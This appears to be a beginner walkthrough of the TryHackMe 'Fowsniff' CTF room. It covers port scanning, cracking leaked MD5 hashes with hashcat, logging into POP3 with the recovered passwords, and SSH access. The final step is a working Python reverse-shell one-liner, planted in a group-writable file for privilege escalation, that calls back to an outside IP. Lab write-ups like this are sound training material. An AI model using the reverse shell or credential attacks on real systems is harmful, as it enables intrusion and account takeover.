---
title: Walkthrough - Fowsniff CTF
published: true
---

Portscanning, Hashes, Bruteforcing, POP3. Hack this machine and get the flag. There are lots of hints along the way and is perfect for beginners!

[https://tryhackme.com/room/ctf](https://tryhackme.com/room/ctf)

* * *

## Task 1 Hack into the FowSniff organisation.

**Using nmap, scan this machine. What ports are open?**

```shell
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA)
|   256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA)
|_  256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Fowsniff Corp - Delivering Solutions
|_http-server-header: Apache/2.4.18 (Ubuntu)
110/tcp open  pop3    Dovecot pop3d
|_pop3-capabilities: USER TOP SASL(PLAIN) UIDL AUTH-RESP-CODE CAPA RESP-CODES PIPELINING
143/tcp open  imap    Dovecot imapd
|_imap-capabilities: AUTH=PLAINA0001 ID ENABLE listed post-login LITERAL+ IMAP4rev1 IDLE have capabilities Pre-login OK LOGIN-REFERRALS more SASL-IR
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Using the information from the open ports. Look around. What can you find?**

- an open webserver open pop3 server and open imap server. we find the Fowsniff corp has been hacked and all credentials leaked.

**Using Google, can you find any public information about them?**

- checking the twitter can see the pastebin dump with all the passwords. And more hints we can use.

```shell
FOWSNIFF CORP PASSWORD LEAK
            ''~``
           ( o o )
+-----.oooO--(_)--Oooo.------+
|                            |
|          FOWSNIFF          |
|            got             |
|           PWN3D!!!         |
|                            |         
|       .oooO                |         
|        (   )   Oooo.       |         
+---------\ (----(   )-------+
           \_)    ) /
                 (_/
FowSniff Corp got pwn3d by B1gN1nj4!
No one is safe from my 1337 skillz!
 
 
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
 
Fowsniff Corporation Passwords LEAKED!
FOWSNIFF CORP PASSWORD DUMP!
 
Here are their email passwords dumped from their databases.
They left their pop3 server WIDE OPEN, too!
 
MD5 is insecure, so you shouldn't have trouble cracking them but I was too lazy haha =P
 
l8r n00bz!
 
B1gN1nj4
```

**Can you decode these md5 hashes? You can even use sites like hashkiller to decode them.**

- hashcat can crack all but stones ``hashcat -m 0 fowsniff.creds rockyou.txt``

```shell
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4:mailcall
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56:bilbo10
tegel@fowsniff:1dc352435fecca338acfd4be10984009:apples01
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb:skyler22
seina@fowsniff:90dc16d47114aa13671c697fd506cf26:scoobydoo2
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b:carp4ever 
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11:orlando12
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e:07011972
```

**Using the usernames and passwords you captured, can you use metasploit to brute force the pop3 login?**

- we can but we already have the credentials, so just going to telnet in.

**What was seina's password to the email service?**

- scoobydoo2

**Can you connect to the pop3 service with her credentials? What email information can you gather?**

```
Trying 10.10.239.3...
Connected to 10.10.239.3.
Escape character is '^]'.
+OK Welcome to the Fowsniff Corporate Mail Server!
USER seina
+OK
PASS scoobydoo2
+OK Logged in.
STAT
+OK 2 2902
LIST
+OK 2 messages:
1 1622
2 1280
.
RETR 1
+OK 1622 octets
Return-Path: <stone@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1000)
        id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,
    mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,
    tegel@fowsniff
Subject: URGENT! Security EVENT!
Message-Id: <20180313185107.0FA3916A@fowsniff>
Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
From: stone@fowsniff (stone)

Dear All,

A few days ago, a malicious actor was able to gain entry to
our internal email systems. The attacker was able to exploit
incorrectly filtered escape characters within our SQL database
to access our login credentials. Both the SQL and authentication
system used legacy methods that had not been updated in some time.

We have been instructed to perform a complete internal system
overhaul. While the main systems are "in the shop," we have
moved to this isolated, temporary server that has minimal
functionality.

This server is capable of sending and receiving emails, but only
locally. That means you can only send emails to other users, not
to the world wide web. You can, however, access this system via 
the SSH protocol.

The temporary password for SSH is "S1ck3nBluff+secureshell"

You MUST change this password as soon as possible, and you will do so under my
guidance. I saw the leak the attacker posted online, and I must say that your
passwords were not very secure.

Come see me in my office at your earliest convenience and we'll set it up.

Thanks,
A.J Stone
```

```
Received: by fowsniff (Postfix, from userid 1004)
        id 101CA1AC2; Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
To: seina@fowsniff
Subject: You missed out!
Message-Id: <20180313185405.101CA1AC2@fowsniff>
Date: Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
From: baksteen@fowsniff

Devin,

You should have seen the brass lay into AJ today!
We are going to be talking about this one for a looooong time hahaha.
Who knew the regional manager had been in the navy? She was swearing like a sailor!

I don't know what kind of pneumonia or something you brought back with
you from your camping trip, but I think I'm coming down with it myself.
How long have you been gone - a week?
Next time you're going to get sick and miss the managerial blowout of the century,
at least keep it to yourself!

I'm going to head home early and eat some chicken soup. 
I think I just got an email from Stone, too, but it's probably just some
"Let me explain the tone of my meeting with management" face-saving mail.
I'll read it when I get back.

Feel better,

Skyler

PS: Make sure you change your email password. 
AJ had been telling us to do that right before Captain Profanity showed up.
```

**Looking through her emails, what was a temporary password set for her?**

- ``S1ck3nBluff+secureshell``

**In the email, who send it? Using the password from the previous question and the senders username, connect to the machine using SSH.**

- baksteen

**Once connected, what groups does this user belong to? Are there any interesting files that can be run by that group?**

- ``id``
- ``find / -user 1001 2>/dev/null``

**Now you have found a file that can be edited by the group, can you edit it to include a reverse shell?**

Python Reverse Shell:

``python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.2.127.225",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'``

When we connect again with ssh it will send us a reverse shell we can login as root.

* * * 

